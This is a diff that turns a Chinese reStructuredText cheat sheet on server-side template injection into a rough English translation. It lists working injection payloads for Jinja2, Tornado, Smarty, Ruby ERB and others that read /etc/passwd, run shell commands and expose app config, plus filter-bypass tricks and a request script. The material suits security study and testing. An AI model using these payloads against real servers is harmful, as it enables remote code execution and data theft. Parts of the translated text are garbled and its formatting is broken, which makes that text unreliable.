@@ -1,105 +1,105 @@
-模版注入
+Template injection
 ========================================
 
-简介
+Introduction
 ----------------------------------------
-模板引擎用于使用动态数据呈现内容。此上下文数据通常由用户控制并由模板进行格式化，以生成网页、电子邮件等。模板引擎通过使用代码构造（如条件语句、循环等）处理上下文数据，允许在模板中使用强大的语言表达式，以呈现动态内容。如果攻击者能够控制要呈现的模板，则他们将能够注入可暴露上下文数据，甚至在服务器上运行任意命令的表达式。
+The template engine is used to render content using dynamic data. This context data is usually controlled by the user and formatted by the template to generate web pages, emails, etc. The template engine allows powerful language expressions to be used in templates to present dynamic content by processing context data using code constructs (such as conditional statements, loops, etc.). If an attacker has control over the template to be rendered, they will be able to inject expressions that expose context data, or even run arbitrary commands on the server.
 
-测试方法
+Test Method
 ----------------------------------------
-- 确定使用的引擎
-- 查看引擎相关的文档，确定其安全机制以及自带的函数和变量
-- 需找攻击面，尝试攻击
+- Determine the engine used
+- View engine-related documentation to determine its security mechanism and its own functions and variables
+- Need to find the attack surface and try to attack
 
-测试用例
+Test cases
 ----------------------------------------
-- 简单的数学表达式，``{{ 7+7 }} => 14``
-- 字符串表达式 ``{{ "ajin" }} => ajin``
+- Simple mathematical expression, ``{{ 7+7 }} => 14``
+- String expression ``{{ "ajin" }} => ajin``
 - Ruby
-    - ``<%= 7 * 7 %>``
-    - ``<%= File.open('/etc/passwd').read %>``
+- ``<%= 7 * 7 %>``
+- ``<%= File.open('/etc/passwd').read %>``
 - Java
-    - ``${7*7}``
+- ``${7*7}``
 - Twig
-    - ``{{7*7}}``
+- ``{{7*7}}``
 - Smarty
-    - ``{php}echo `id`;{/php}``
+- ``{php}echo `id`;{/php}``
 - AngularJS
-    - ``$eval('1+1')``
+- ``$eval('1+1')``
 - Tornado
-    - 引用模块 ``{% import module %}``
-    - => ``{% import os %}{{ os.popen("whoami").read() }}``
+- Reference module ``{% import module %}``
+- => ``{% import os %}{{ os.popen("whoami").read() }}``
 - Flask/Jinja2
-    - ``{{ config }}``
-    - ``{{ config.items() }}``
-    - ``{{get_flashed_messages.__globals__['current_app'].config}}``
-    - ``{{''.__class__.__mro__[-1].__subclasses__()}}``
-    - ``{{ url_for.__globals__['__builtins__'].__import__('os').system('ls') }}``
-    - ``{{ request.__init__.__globals__['__builtins__'].open('/etc/passwd').read() }}``
+- ``{{ config }}``
+- ``{{ config.items() }}``
+- ``{{get_flashed_messages.__globals__['current_app'].config}}``
+- ``{{''.__class__.__mro__[-1].__subclasses__()}}``
+- ``{{ url_for.__globals__['__builtins__'].__import__('os').system('ls') }}``
+- ``{{ request.__init__.__globals__['__builtins__'].open('/etc/passwd').read() }}``
 - Django
-    - ``{{ request }}``
-    - ``{% debug %}``
-    - ``{% load module %}``
-    - ``{% include "x.html" %}``
-    - ``{% extends "x.html" %}``
+- ``{{ request }}``
+- ``{% debug %}``
+- ``{% load module %}``
+- ``{% include "x.html" %}``
+- ``{% extends "x.html" %}``
 
-目标
+Target
 ----------------------------------------
-- 创建对象
-- 文件读写
-- 远程文件包含
-- 信息泄漏
-- 提权
+- Create an object
+- File reading and writing
+- Remote file contains
+- Information leakage
+- Elevation of Rights
 
-相关属性
+Related attributes
 ----------------------------------------
 
 ``__class__``
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-python中的新式类（即显示继承object对象的类）都有一个属性 ``__class__`` 用于获取当前实例对应的类，例如 ``"".__class__`` 就可以获取到字符串实例对应的类
+New classes in python (i.e. classes that display inheriting object objects) have a property ``__class__`` used to get the corresponding class of the current instance, such as ``"".__class__`` to get the corresponding class of the string instance. kind
 
-``__mro__`` 
+``__mro__``
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-python中类对象的 ``__mro__`` 属性会返回一个tuple对象，其中包含了当前类对象所有继承的基类，tuple中元素的顺序是MRO（Method Resolution Order） 寻找的顺序。
+The ``__mro__`` property of a class object in python will return a tuple object, which contains all the inherited base classes of the current class object. The order of elements in the tuple is the order found by MRO (Method Resolution Order).
 
 ``__globals__``
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-保存了函数所有的所有全局变量，在利用中，可以使用 ``__init__`` 获取对象的函数，并通过 ``__globals__`` 获取 ``file`` ``os`` 等模块以进行下一步的利用
+All global variables of the function are saved. In use, you can use ``__init__`` to get the object's function and obtain the ``file```````, etc. modules such as ```` to proceed to the next step. use
 
 ``__subclasses__()``
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-python的新式类都保留了它所有的子类的引用，``__subclasses__()`` 这个方法返回了类的所有存活的子类的引用（是类对象引用，不是实例）。
+Python's new class retains references to all its subclasses. The ``__subclasses__()` method returns references to all the living subclasses of the class (a class object reference, not an instance).
 
-因为python中的类都是继承object的，所以只要调用object类对象的 ``__subclasses__()`` 方法就可以获取想要的类的对象。
+Because all classes in python inherit object, you can get the object of the desired class by calling the ``__subclasses__()`` method of the object class object.
 
-常见Payload
+Common Payloads
 ----------------------------------------
 - ``().__class__.__bases__[0].__subclasses__()[40](r'/etc/passwd').read()``
 - ``().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__("os").popen("ls /").read()' )``
 
-绕过技巧
+Bypassing Tips
 ----------------------------------------
 
-字符串拼接
+String stitching
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 ``request['__cl'+'ass__'].__base__.__base__.__base__['__subcla'+'sses__']()[60]``
 
-使用参数绕过
+Bypass using parameters
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 ::
 
-    params = {
-        'clas': '__class__',
-        'mr': '__mro__',
-        'subc': '__subclasses__'
-    }
-    data = {
-        "data": "{{''[request.args.clas][request.args.mr][1][request.args.subc]()}}"
-    }
-    r = requests.post(url, params=params, data=data)
-    print(r.text)
+params = {
+'clas': '__class__',
+'mr': '__mro__',
+'subc': '__subclasses__'
+}
+data = {
+"data": "{{''[request.args.clas][request.args.mr][1][request.args.subc]()}}"
+}
+r = requests.post(url, params=params, data=data)
+print(r.text)
 
-参考链接
+Reference link
 ----------------------------------------
-- `服务端模版注入 <https://zhuanlan.zhihu.com/p/28823933>`_
-- `用Python特性任意代码执行 <http://blog.knownsec.com/2016/02/use-python-features-to-execute-arbitrary-codes-in-jinja2-templates/>`_
+- `Server-side template injection <https://zhuanlan.zhihu.com/p/28823933>`_
+- `Execute arbitrary code with Python features <http://blog.knownsec.com/2016/02/use-python-features-to-execute-arbitrary-codes-in-jinja2-templates/>`_
